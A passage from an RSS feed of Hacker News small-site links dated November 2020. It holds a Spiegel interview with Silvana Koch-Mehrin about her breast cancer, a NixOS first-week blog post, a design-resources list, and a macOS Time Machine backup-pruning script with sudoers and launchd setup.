<p><strong>DER SPIEGEL:</strong> You were long seen as a kind of superwoman during your political career with the liberal Free Democrats (FDP), combining career and family, with never a hair out of place. You were also fond of playing that role. How has breast cancer changed your feeling of femininity?</p><p><strong>Koch-Mehrin:</strong> Do I hear the male perspective seeping through? Long hair on the head and no hair on the legs? Only a woman if you have breasts? That's nonsense. Take a look at the self-confident women at #goingflat or #onebreastpride. That is a kind of femininity that has nothing to do with conventions. I admire it.</p><p><strong>DER SPIEGEL:</strong> You haven't given an interview for nine years. Are you considering a return to politics?</p><p><strong>Koch-Mehrin:</strong> If I wanted to return to politics, I certainly wouldn't do so with an interview. My focus is elsewhere entirely. I decided to do this interview to address the silence surrounding cancer and to encourage openness in dealing with serious illnesses.</p><p><strong>DER SPIEGEL:</strong> What did you find particularly helpful during the most difficult times?</p><p><strong>Koch-Mehrin:</strong> I was overwhelmed by the readiness to help, the warmth and the empathy I experienced from family and friends, but also from people whom I hardly knew. My husband and brother shaved their hair off in solidarity. Particularly in moments of despondence, I found it encouraging to hear about how open other women were about their illness.</p><p><strong>DER SPIEGEL:</strong> How great is the danger of remission?</p><p><strong>Koch-Mehrin:</strong> There isn't a single day when I don't think of cancer. The statistical improbability of remission is certainly reassuring, but every checkup sets me off on an emotional rollercoaster.</p><p><strong>DER SPIEGEL:</strong> How did you tell your daughters about your diagnosis?</p><p><strong>Koch-Mehrin:</strong> I was open and honest with them because I wanted them to continue trusting me.</p><p><strong>DER SPIEGEL:</strong> What were the most difficult moments?</p>
</section>
<blockquote>

<div>
<p>"I wanted to be strong for my children."</p>
</div>

</blockquote>
<section>
<p><strong>Koch-Mehrin:</strong> The first and last chemotherapy sessions were extremely challenging. At the first one, I was so afraid of the side effects that I almost went crazy. By the last session, my mental strength was almost completely used up. I didn't want to do it anymore. I was only able to make it through because I wanted to be strong for my children.</p><p><strong>DER SPIEGEL:</strong> What aspects of the experience did you underestimate?</p><p><strong>Koch-Mehrin:</strong> That it is a marathon. The treatment goes on for so long, it was almost nine months for me, and it is difficult. And afterwards, it still isn't over. A small example: fingernails take months to grow back normally. And I will be facing regular follow-up appointments for the next 10 years. Plus, some side effects are permanent.</p><p><strong>DER SPIEGEL:</strong> What were the most important lessons you learned?</p><p><strong>Koch-Mehrin:</strong> For the first time in my life, I really became acquainted with fear. And I had to learn how to deal with it. It's easy for me to say, but it's not easy to do.</p><p><strong>DER SPIEGEL:</strong> Whether you wanted to or not, you fulfilled the classic stereotypes of the blond during your political career. What was it like to be bald and have to wear a wig?</p><p><strong>Koch-Mehrin:</strong> I missed these kinds of questions so much …</p><p><strong>DER SPIEGEL:</strong> … it is my pleasure.</p><p><strong>Koch-Mehrin:</strong> Promoting clichés is apparently still part of the standard repertoire of journalism. The virologist Sandra Ciesek is a token woman at the side of Christian Drosten, of course. In the Reykjavik Index, which measures the influence stereotypes have on opinions, Germany doesn't do particularly well. Such questions, which subconsciously strengthen prejudices, contribute to that.</p><p><strong>DER SPIEGEL:</strong> Fine, but you were pretty good at the blond game. You knew very well that in a male-dominated party such as the FDP, you got a lot of attention and that you wouldn't have risen through the ranks so quickly if you had been a man. That is exactly why those who were envious of you abandoned you in 2011 and were happy to see you fall. Did your illness change any of your political positions?</p><p><strong>Koch-Mehrin:</strong> Everyone should have access to first-class health care, irrespective of how much money they have. COVID-19 has made us all realize how vulnerable we are.</p><p><strong>DER SPIEGEL:</strong> You sound like the Social Democratic health expert Karl Lauterbach.</p><p><strong>Koch-Mehrin:</strong> Take a look at what (Free Democrat) Daniel Bahr proposed back when he was health minister: a legally mandated health-care system rooted in liberalism. It was an intelligent and affordable program that put the focus on the patient.</p><p><strong>DER SPIEGEL:</strong> Do you miss the FDP?</p><p><strong>Koch-Mehrin:</strong> Some fellow party members became real friends of mine, and I've stayed in touch with a lot of them, even if most are no longer active in politics. I am still convinced that Germany needs a strong liberal party. But I am no longer engaged in party politics. Today, I work with and for women politicians around the world in a strictly non-partisan manner. I am head of Women Political Leaders, a foundation which aims at increasing both the number and the influence of women in politics.</p><p><strong>DER SPIEGEL:</strong> Will you vote for the FDP in the general election next year?</p><p><strong>Koch-Mehrin:</strong> I will always vote for a liberal party.</p><p><strong>DER SPIEGEL:</strong> Many cancer patients look for reasons why they fell ill, whether it be stress or an unhealthy lifestyle. What explanation did you come up with?</p>
</section>
<blockquote>

<div>
<p>"The most important thing is that the women in question feel good about the decision they make, and not whether others like it or not."</p>
</div>

</blockquote>
<section>
<p><strong>Koch-Mehrin:</strong> It is pretty much impossible to not search for potential causes. There have been huge advances in treatments and cures for breast cancer, but the "why" question has never been adequately answered. The pill is a blessing, because it provides women with self-determination. But I'm not the only one furious at the fact that even 50 years after the pill's introduction, hormones are the focus of contraception, even though the correlation with breast cancer is clear and proven. The focus must be more squarely on women's health.</p><p><strong>DER SPIEGEL:</strong> The Reykjavik Global Forum, which is organized by your foundation every year, recognizes initiatives that are important for women. This year, the prize has been awarded to the pink ribbon, the symbol for the fight against breast cancer. Why?</p><p><strong>Koch-Mehrin:</strong> The pink ribbon, which was introduced exactly 30 years ago, is now a global symbol of the fight against breast cancer. Because women - and now also men – have joined together around the world for the fight, it has been a huge success story. Many women are now able to survive breast cancer because it has been possible to destigmatize the illness, collect donations, finance research and improve treatments. That is what we are recognizing. Prize recipients are the American Nancy Brinker, the first to use the pink ribbon back in the 1990s, and Vigdís Finnbogadóttir of Iceland, a breast cancer survivor and activist in addition to being the first female head of state in the world.</p><p><strong>DER SPIEGEL:</strong> The Berlin-based music journalist Anja Caspary is extremely open about her double mastectomy, not shying away from wearing tight tops in public, which confuses some. What do you think about her confrontational strategy?</p><p><strong>Koch-Me…</strong></p></section></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.spiegel.de/international/zeitgeist/a-personal-experience-with-breast-cancer-only-a-woman-if-you-have-breasts-that-s-nonsense-a-88da903d-2aa5-428b-99d6-a4fc4ce28a68">https://www.spiegel.de/international/zeitgeist/a-personal-experience-with-breast-cancer-only-a-woman-if-you-have-breasts-that-s-nonsense-a-88da903d-2aa5-428b-99d6-a4fc4ce28a68</a></em></p>]]>
            </description>
            <link>https://www.spiegel.de/international/zeitgeist/a-personal-experience-with-breast-cancer-only-a-woman-if-you-have-breasts-that-s-nonsense-a-88da903d-2aa5-428b-99d6-a4fc4ce28a68</link>
            <guid isPermaLink="false">hacker-news-small-sites-25024715</guid>
            <pubDate>Sun, 08 Nov 2020 10:31:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[One Week of NixOS]]>
            </title>
            <description>
<![CDATA[
Score 238 | Comments 153 (<a href="https://news.ycombinator.com/item?id=25024639">thread link</a>) | @jaemoe
<br/>
November 8, 2020 | https://jae.moe/blog/2020/11/one-week-of-nixos/ | <a href="https://web.archive.org/web/*/https://jae.moe/blog/2020/11/one-week-of-nixos/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <h4>One week of NixOS</h4><p>
            Reading time: 4 minutes.
            </p><p>As you may have seen I on Mastodon, I am testing NixOS for over a week now and here is a few comments about how the distro works and what doesn’t work for me.</p>










<p>First, everything is NixOS is declared in a configuration file located at <code>/etc/nixos/configuration.nix</code> where you declare packages you want to install, services to start, udev rules, ECT, you get it.</p>
<p>This is the first very weird thing as you don’t really install packages with the CLI directly (even if you can), instead you modify the config file and rebuild the system with <code>nixos-rebuild switch</code>.</p>
<p>NixOS is made in such a way that everything aims to be reproducible. An example: if you want to get the exact same setup as I have, you can just take <a href="https://forge.tedomum.net/jae/nixos-configs">my configs repo</a>, clone it on your NixOS installation, run <code>nixos-rebuild switch</code> and voilà, you will have the exact same programs as me installed in the same way with the same version (roughly).</p>
<p>In this distro, adding a user is really easy and goes like this:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span><span>18
</span><span>19
</span><span>20
</span><span>21
</span><span>22
</span><span>23
</span><span>24
</span><span>25
</span></code></pre></td>
<td>
<pre><code data-lang="nixos"><span>{</span> <span>config</span><span>,</span> <span>pkgs</span><span>,</span> <span>...</span> <span>}:</span>

<span>{</span>

    <span>users</span><span>.</span><span>groups</span><span>.</span><span>plugdev</span> <span>=</span> <span>{};</span>

    <span>users</span><span>.</span><span>users</span><span>.</span><span>jae</span> <span>=</span> <span>{</span>
        <span>isNormalUser</span> <span>=</span> <span>true</span><span>;</span>
        <span>extraGroups</span> <span>=</span> <span>[</span> <span>"wheel"</span> <span>"docker"</span> <span>"adbusers"</span> <span>"plugdev"</span> <span>];</span>
        <span>shell</span> <span>=</span> <span>pkgs</span><span>.</span><span>zsh</span><span>;</span>
        <span>packages</span> <span>=</span> <span>with</span> <span>pkgs</span><span>;</span> <span>[</span>
            <span># Games</span>
            <span>minetest</span> <span>stepmania</span> <span>lutris-free</span> <span>pcsx2</span>
            <span># Misc audio / video / image</span>
            <span>pulseeffects</span> <span>ffmpeg-full</span> <span>obs-studio</span> <span>inkscape</span> <span>krita</span>
            <span># Useful software</span>
            <span>mumble</span> <span>qbittorrent</span> <span>libreoffice</span> <span>ledger-live-desktop</span>
            <span># Dev</span>
            <span>jetbrains</span><span>.</span><span>idea-community</span> <span>lazygit</span> <span>gnome3</span><span>.</span><span>zenity</span> <span>insomnia</span> <span>jetbrains</span><span>.</span><span>rider</span> <span>mono</span> <span>msbuild</span> <span>dotnet-sdk_3</span> <span>ganttproject-bin</span> <span>kubectx</span>
            <span># SDR</span>
            <span>rtl-sdr</span> <span>gqrx</span> <span>gpredict</span> <span>noaa-apt</span> <span>welle-io</span>
        <span>];</span>
    <span>};</span>
    <span>users</span><span>.</span><span>extraGroups</span><span>.</span><span>vboxusers</span><span>.</span><span>members</span> <span>=</span> <span>[</span> <span>"jae"</span> <span>];</span>
<span>}</span></code></pre></td></tr></tbody></table>
</div>
</div>
<p>Let’s see what everything does!</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span></code></pre></td>
<td>
<pre><code data-lang="nixos"> <span>users</span><span>.</span><span>groups</span><span>.</span><span>plugdev</span> <span>=</span> <span>{};</span></code></pre></td></tr></tbody></table>
</div>
</div><p>
Creates a group named <code>plugdev</code>, don’t pay attention to it, it is just a test for the Ledger Live application.</p>
<p>
Tells the os that the current user is a normal one. It will create a home folder and set the default shell.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span></code></pre></td>
<td>
<pre><code data-lang="nixos"> <span>extraGroups</span> <span>=</span> <span>[</span> <span>"wheel"</span> <span>"docker"</span> <span>"adbusers"</span> <span>"plugdev"</span> <span>];</span></code></pre></td></tr></tbody></table>
</div>
</div><p>
Here, we are setting the groups the user is in to grant special permissions.</p>
<p>
As you may have guessed it, we are setting the default user shell to ZSH.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span></code></pre></td>
<td>
<pre><code data-lang="nixos"> <span>packages</span> <span>=</span> <span>with</span> <span>pkgs</span><span>;</span> <span>[</span>
            <span># Games</span>
            <span>minetest</span> <span>stepmania</span> <span>lutris-free</span> <span>pcsx2</span>
            <span># Misc audio / video / image</span>
            <span>pulseeffects</span> <span>ffmpeg-full</span> <span>obs-studio</span> <span>inkscape</span> <span>krita</span>
            <span># Useful software</span>
            <span>mumble</span> <span>qbittorrent</span> <span>libreoffice</span> <span>ledger-live-desktop</span>
            <span># Dev</span>
            <span>jetbrains</span><span>.</span><span>idea-community</span> <span>lazygit</span> <span>gnome3</span><span>.</span><span>zenity</span> <span>insomnia</span> <span>jetbrains</span><span>.</span><span>rider</span> <span>mono</span> <span>msbuild</span> <span>dotnet-sdk_3</span> <span>ganttproject-bin</span> <span>kubectx</span>
            <span># SDR</span>
            <span>rtl-sdr</span> <span>gqrx</span> <span>gpredict</span> <span>noaa-apt</span> <span>welle-io</span>
        <span>];</span></code></pre></td></tr></tbody></table>
</div>
</div><p>
There, we are installing per-user packages because yes, NixOS supports that, any user can have its own packages that others users can’t access.</p>
<blockquote>
<p>Correction from <em>hvdijk</em> on Hacker News, “<em>Other users can access those packages if they want to. Those packages won’t show up in other users' $PATH, so other users will not be affected by them, but they could see what’s in /nix/store if they wanted to. This matters when you’re thinking of putting private data (such as an encryption key) in a package: it’s vital that you don’t do that on a multi-user system.</em>”</p>
</blockquote>
<p>Configuring NixOS for a daily use is at the end very easy (although I am getting some trouble to get Ledger Live working; which is the biggest problem I’ve had so far).</p>
<p>Now, let’s talk about where I got some trouble.
As you may know it, I am a dev and every day I need to compile, test, run and so on.
NixOS gave me some trouble to only run some programs from source such as <a href="https://element.io/">Element Desktop</a> or <a href="https://img.tedomum.net/">TeDomum IMG</a> as the way the system is built, lots of directories are read-only and programs can’t be installed globally through NPM or PIP.
I ended up using Docker to build the apps (even if it took a bit more time).</p>
<p>Needless to say, almost every other project worked.
If you want NodeJS to start a project for instance, you can just do <code>nix-shell -p nodejs</code> and here you go, a shell with nodejs installed, ready to do what you want.</p>
<p>At the end, NixOS brings very interesting concepts such as a really great reproducibility but new users can feel lost as its way to work is really different from conventional Linux distributions.
I’ll give NixOS more time and write a follow-up in some time to see how everything went.</p>
<p>If you want to give it a shot, the <a href="https://nixos.org/">official NixOS website awaits you</a>!</p>
<p>That’s all for today,
I’ll see you next time!
If you like my content, <a href="https://jae.moe/blog/index.xml">don’t forget to subscribe through RSS</a>!</p>

            
                <p><a href="https://news.ycombinator.com/item?id=25024639">Talk about it on Hacker News!</a>
            
        </p></div></div>]]>
            </description>
            <link>https://jae.moe/blog/2020/11/one-week-of-nixos/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25024639</guid>
            <pubDate>Sun, 08 Nov 2020 10:17:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[More Free Design Resources for Developers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25024623">thread link</a>) | @moeminm
<br/>
November 8, 2020 | https://blog.moeminmamdouh.com/20-more-free-design-resources-for-developers | <a href="https://web.archive.org/web/*/https://blog.moeminmamdouh.com/20-more-free-design-resources-for-developers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1604830238180/sI-dunVYp.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div><div><div><p>Subscribe to <!-- -->my<!-- --> newsletter and never miss <!-- -->my<!-- --> upcoming articles</p></div></div></div><div itemprop="text"><p>In continuation of the previous  <a target="_blank" href="https://blog.moeminmamdouh.com/20-free-design-resources-for-developers">post</a>, here are 30+ more free design resources for developers.</p>

<ul>
<li><p><a target="_blank" href="https://mixkit.co/?ref=blog.moeminmamdouh.com">Mixkit</a>: Awesome Stock Video Clips, Stock Music, Sound Effects &amp; Video Templates. All available for free!</p>
</li>
<li><p><a target="_blank" href="https://www.pexels.com/?ref=blog.moeminmamdouh.com">Pexels</a>: Free stock photos you can use everywhere. ✓ Free for commercial use ✓ No attribution required.</p>
</li>
<li><p><a target="_blank" href="https://unsplash.com/?ref=blog.moeminmamdouh.com">Unsplash</a>: The internet’s source of freely-usable images. Powered by creators everywhere.</p>
</li>
<li><p><a target="_blank" href="https://burst.shopify.com/?ref=blog.moeminmamdouh.com">Burst</a>: Browse thousands of beautiful copyright-free images. All our pictures are free to download for personal and commercial use, no attribution required.</p>
</li>
<li><p><a target="_blank" href="https://coverr.co/?ref=blog.moeminmamdouh.com">Coverr</a>: Beautiful Free Stock Video Footage.</p>
</li>
</ul>

<ul>
<li><p><a target="_blank" href="https://www.typewolf.com/?ref=blog.moeminmamdouh.com">Typewolf</a>: Typewolf helps designers and developers choose the perfect font combination for their next design project.</p>
</li>
<li><p><a target="_blank" href="https://fonts.google.com/?ref=blog.moeminmamdouh.com">Google Fonts</a>: Making the web more beautiful, fast, and open through great typography.</p>
</li>
<li><p><a target="_blank" href="https://fontsarena.com/?ref=blog.moeminmamdouh.com">FontsArena</a>: Free fonts, free alternatives to premium fonts, done-for-you-research articles. Open startup.</p>
</li>
<li><p><a target="_blank" href="https://www.speakhuman.today/?ref=blog.moeminmamdouh.com">Speak Human</a>: Generate human centric microcopy for all purposes.</p>
</li>
<li><p><a target="_blank" href="https://www.fontfabric.com/free-fonts/?ref=blog.moeminmamdouh.com">Font Foundry</a>: A digital type foundry crafting retail fonts and custom typography for various brands. Sharing a passion for premium typefaces, calligraphy and lettering.</p>
</li>
</ul>

<ul>
<li><p><a target="_blank" href="https://www.amazon.com/dp/0321965515">Don't Make Me Think</a></p>
</li>
<li><p><a target="_blank" href="https://www.amazon.com/Hooked-How-Build-Habit-Forming-Products/dp/1591847788/">Hooked: How to Build Habit-Forming Products</a></p>
</li>
<li><p><a target="_blank" href="https://www.amazon.com/dp/0465050654">The Design of Everyday Things</a></p>
</li>
<li><p><a target="_blank" href="https://www.amazon.com/Things-Designer-People-Voices-Matter/dp/0321767535/">100 Things Every Designer Needs to Know About People</a></p>
</li>
</ul>

<ul>
<li><p><a target="_blank" href="https://www.checklist.design/?ref=blog.moeminmamdouh.com">Checklist Design</a>: A collection of the best design practices.</p>
</li>
<li><p><a target="_blank" href="https://icons8.com/upscaler/?ref=blog.moeminmamdouh.com">AI Image Upscaler</a>: Enhance image resolution with AI.</p>
</li>
<li><p><a target="_blank" href="https://www.glyphy.io/?ref=blog.moeminmamdouh.com">Glyphy</a>: Copy and paste glyphs with ease.</p>
</li>
</ul>

<ul>
<li><p><a target="_blank" href="https://2.flexiple.com/scale/all-illustrations?ref=blog.moeminmamdouh.com">Scale</a>[One new high-quality, open-source illustration each day. Use our color-picker to adapt the illustrations to your brand identity!)</p>
</li>
<li><p><a target="_blank" href="https://formito.com/tools/favicon/?ref=blog.moeminmamdouh.com">Free Favicon Maker</a>: Generate favicons and watch a live preview in your tab.</p>
</li>
<li><p><a target="_blank" href="https://www.colorsandfonts.com/?ref=blog.moeminmamdouh.com">Colors and Fonts</a>: Find colors and typography combinations ready to copy paste in one click.</p>
</li>
</ul>
<p>As always, if you have any resources you'd like me to post in the next issue, do let me know and I'll have it included if it's suitable.</p>
<p>See you next time!</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.moeminmamdouh.com/20-more-free-design-resources-for-developers</link>
            <guid isPermaLink="false">hacker-news-small-sites-25024623</guid>
            <pubDate>Sun, 08 Nov 2020 10:15:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pro Rata and User Centric Distribution Models: A Comparative Study (2017)]]>
            </title>
            <description>
<![CDATA[
Score 83 | Comments 85 (<a href="https://news.ycombinator.com/item?id=25024552">thread link</a>) | @iamacyborg
<br/>
November 8, 2020 | http://www.digitalmedia.fi/wp-content/uploads/2018/02/UC_report_final_171213.pdf | <a href="https://web.archive.org/web/*/http://www.digitalmedia.fi/wp-content/uploads/2018/02/UC_report_final_171213.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.digitalmedia.fi/wp-content/uploads/2018/02/UC_report_final_171213.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25024552</guid>
            <pubDate>Sun, 08 Nov 2020 10:01:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Protecting TimeMachine Backups from Itself]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25024547">thread link</a>) | @gingerlime
<br/>
November 8, 2020 | https://blog.gingerlime.com/2020/going-down-the-time-machine-rabbit-hole/ | <a href="https://web.archive.org/web/*/https://blog.gingerlime.com/2020/going-down-the-time-machine-rabbit-hole/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-2650">
		<!-- .entry-header -->

	
	<div>
		
<h2>Going down the time machine rabbit hole…</h2>



<p>I love the fact that MacOS comes with TimeMachine built-in, and I also really appreciate its simplicity. It makes backups easy and accessible even for non-technical people. It gets messy though if you also want to have real offsite backups however.</p>



<p>TimeMachine works great with a USB external HD, but things get tricky over the network.</p>



<p>I own a small Synology NAS, and I managed to mount a TimeMachine volume and get it to backup to that volume. The problem started when the volume size started to grow. I could set a quota on the volume, but for some strange reason, when the quota is reached, TimeMachine just started failing without a clear reason. There’s no way to tell TimeMachine to only keep X versions, or keep disk storage below a certain threshold. It’s <em>supposed</em> to prune backups automatically, but seems to fail with my network volume.</p>



<h2>tmutil to the rescue</h2>



<p>After a bit of digging, I discovered a useful command-line utility that helps managing TimeMachine. <code>tmutil</code> lets you list your backups and also delete specific backups. I could manually easily prune the oldest backup of TimeMachine using <code>tmutil listbackups | head -1 | xargs -I {} sudo tmutil delete "{}"</code>.</p>



<p>How difficult could it be to automate this script so it runs regularly and keeps X copies?</p>



<h2>The script</h2>



<p>The script itself was pretty simple. Please don’t bash my bash skills, but I hope the code is clear and seems to do the job</p>


<pre title="">#!/bin/bash

# keeps backups for up to 7 days
KEEP=7

function timestamp() {
    date -jf '%F-%H%M%S' "$1" '+%s'
}

LAST_BACKUP=$(/usr/bin/tmutil listbackups | /usr/bin/tail -n1)
LAST_BACKUP_DATE=$(basename "$LAST_BACKUP")
LAST_TIMESTAMP=$(timestamp $LAST_BACKUP_DATE)

OLDEST_BACKUP=$(/usr/bin/tmutil listbackups | /usr/bin/head -n1)
OLDEST_BACKUP_DATE=$(basename "$OLDEST_BACKUP")
OLDEST_TIMESTAMP=$(timestamp $OLDEST_BACKUP_DATE)

DIFF=$(( ($LAST_TIMESTAMP - $OLDEST_TIMESTAMP) / (24*3600) ))

while [[ $DIFF &gt; $KEEP ]]; do
    echo "cleaning"
    sudo tmutil delete "$OLDEST_BACKUP"
    OLDEST_BACKUP=$(/usr/bin/tmutil listbackups | /usr/bin/head -n1)    
    OLDEST_BACKUP_DATE=$(basename "$OLDEST_BACKUP")
    OLDEST_TIMESTAMP=$(timestamp $OLDEST_BACKUP_DATE)
    DIFF=$(( ($LAST_TIMESTAMP - $OLDEST_TIMESTAMP) / (24*3600) ))
done
</pre>


<p>Easy-peasy, right? There were two problems left to solve:</p>



<ol><li>run this script on schedule, let’s say once a day or once a week</li><li>make sure we can run this as root, so we don’t need to use <code>sudo</code> (or avoid the password prompt if we do run sudo)</li></ol>



<h2>How difficult can it be?</h2>



<p>Running scheduled jobs on MacOS is quite a bit different from Linux. You could still somehow use a cron job, but it’s not recommended, might be deprecated, and generally not the “right way” to do things. You are supposed to create a <code>launchd</code> script… Ok, so without digging too deep, here’s a simple launchd file for running a command every 24 hours. You need to place this file under <code>~/Library/LaunchAgents/</code> and give it a name like <code>org.whatever.script-name.plist</code></p>


<pre title="">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
    &lt;key&gt;Label&lt;/key&gt;
    &lt;!-- The label should be the same as the filename without the extension --&gt;
    &lt;string&gt;org.whatever.script-name&lt;/string&gt;
    &lt;!-- Specify how to run your program here --&gt;
    &lt;key&gt;ProgramArguments&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;/path/to/code/timemachine-cleanup.sh&lt;/string&gt;
    &lt;/array&gt;
    &lt;!-- Run every 24 hours --&gt;
    &lt;key&gt;StartInterval&lt;/key&gt;
    &lt;integer&gt;86400&lt;/integer&gt;&lt;!-- seconds --&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</pre>


<p>Then you would need to run this command, so the launchd script gets scheduled</p>



<p><code>launchctl load org.whatever.script-name.plist</code></p>



<p>note: if you need to stop your script from running, you can use the same command, but with <code>unload</code> instead to unload it.</p>



<h2>First problem: Run as root</h2>



<p>The first problem is that this job now runs as your own user id. This is fixable if you move the file to the global /Library/LaunchAgents, make the owner of the file root and use sudo to load it.  It runs as root, but tmutil now fails. Why? because some tools/operations like tmutil require something called Full Disk Access (FDA). </p>



<h2>Second problem: Full Disk Access</h2>



<p>Here’s an interesting post explaining <a href="https://eclecticlight.co/2020/02/15/why-privileged-commands-may-never-be-allowed/" target="_blank" rel="noreferrer noopener">why some privileged commands are not allowed on MacOS</a>, and a few <a href="https://apple.stackexchange.com/questions/338213/how-to-run-a-launchagent-that-runs-a-script-which-causes-failures-because-of-sys" target="_blank" rel="noreferrer noopener">problems/workarounds being suggested </a>on StackOverflow’s Ask Different.</p>



<p>You can get those commands to run from your terminal, if you add your terminal to the list of allowed apps with Full Disk Access</p>



<figure><img loading="lazy" width="853" height="758" src="https://blog.gingerlime.com/assets/CleanShot-2020-11-08-at-10.15.10.png" alt="" srcset="https://blog.gingerlime.com/assets/CleanShot-2020-11-08-at-10.15.10.png 853w, https://blog.gingerlime.com/assets/CleanShot-2020-11-08-at-10.15.10-300x267.png 300w, https://blog.gingerlime.com/assets/CleanShot-2020-11-08-at-10.15.10-768x682.png 768w" sizes="(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px"></figure>



<p>The problem however, is that for some strange reason, you cannot simply add your script to the list. Or you could add it, but it will still be blocked. I have no clue why.</p>



<h2>Workaround: wrap your script as an app</h2>



<p>You could use Automator.app or Script Editor to do that. You can then add this wrapper app to give it Full Disk Access permissions. That works, but then there’s no way to make it run as root. So we’re back to the first problem again… :-/</p>



<h2>Workaround #2: sudoers with NOPASSWD</h2>



<p>So we won’t run it as root, but use sudo. Then we’re prompted for a password, which we tried to avoid for a scheduled job.</p>



<p>We can however add any specific command to be allowed to run with sudo without a password. We’ll run <code>sudo visudo</code> and then edit the file to add this line:</p>



<p><code>myuser ALL=(ALL) NOPASSWD: /usr/bin/tmutil</code></p>



<p>If you want to be even more secure, you can include the sha256 hash of tmutil. First get the hash by running <code>sha256sum /usr/bin/tmutil</code> and then adding this sha to your sudoers file. Mine looks like this</p>



<p><code>myuser ALL=(ALL) NOPASSWD: sha256:57a753bd2bef425205684630a676765913e1adca7ec0a9d73c205e4da32488c6 /usr/bin/tmutil</code></p>



<h2>Alternatives to app wrapper</h2>



<p>One thing I noticed with the wrapper app is that when it launches, it’s visible on my desktop. It could even grab my input for a moment, which is slightly annoying. It also felt weird to have a whole app just to wrap a script to give it Full Disk Access.</p>



<p>One alternative mentioned on the <a href="https://apple.stackexchange.com/questions/338213/how-to-run-a-launchagent-that-runs-a-script-which-causes-failures-because-of-sys" target="_blank" rel="noreferrer noopener">linked StackOverflow page</a> above is to compile a binary app to wrap your shell script. I didn’t try it, since I am not using any compiled languages regularly.</p>



<p>Another thing I did try and will probably end up using is launching the script via the terminal. How? I already have passwordless (public key) SSH remote login access set up on my Mac. So I simply modified the launchd script slightly so it launches my script via ssh</p>


<pre title="">&lt;key&gt;ProgramArguments&lt;/key&gt;
&lt;array&gt;
    &lt;string&gt;ssh&lt;/string&gt;
    &lt;string&gt;myuser@myhost.local&lt;/string&gt;
    &lt;string&gt;/path/to/code/timemachine-cleanup.sh&lt;/string&gt;
&lt;/array&gt;
</pre>


<p>Since terminal is already set with FDA, this seems to work :)</p>



<p>It’s a bit of an awkward workaround to ssh to your own host with your own user in order to run a script, but it’s not that much different from compiling a binary to wrap your script, or wrapping it in an “app”.</p>



<h2>Why TimeMachine?</h2>



<p>I guess some people might rightfully question why I’m using TimeMachine and not a more flexible backup tool for Mac. I did consider it and tested a couple of options like CarbonCopyCloner and others. As far as I could tell, none of the commercial backup tools can create a full machine image on a remote network storage like TimeMachine does. If you know of something that does this, please let me know!</p>



<p>… and for those backup freaks out there: No. the Synology volume isn’t my only backup copy. I then also run restic to clone the TimeMachine volume to Backblaze B2 for offsite safekeeping.</p>
	</div><!-- .entry-content -->

	 <!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://blog.gingerlime.com/2020/going-down-the-time-machine-rabbit-hole/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25024547</guid>
            <pubDate>Sun, 08 Nov 2020 10:01:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pongmechanik]]>
            </title>
            <description>
<![CDATA[
Score 32 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25024499">thread link</a>) | @remix2000
<br/>
November 8, 2020 | http://cyberniklas.de/pongmechanik/indexen.html | <a href="https://web.archive.org/web/*/http://cyberniklas.de/pongmechanik/indexen.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://cyberniklas.de/pongmechanik/indexen.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25024499</guid>
            <pubDate>Sun, 08 Nov 2020 09:52:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[PostgreSQL Configuration for Humans]]>
            </title>
            <description>
<![CDATA[
Score 245 | Comments 38 (<a href="https://news.ycombinator.com/item?id=25024224">thread link</a>) | @sharjeelsayed
<br/>
November 8, 2020 | https://postgresqlco.nf/en/doc/param/ | <a href="https://web.archive.org/web/*/https://postgresqlco.nf/en/doc/param/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    <div id="welcome">
      
      <div lang="en">
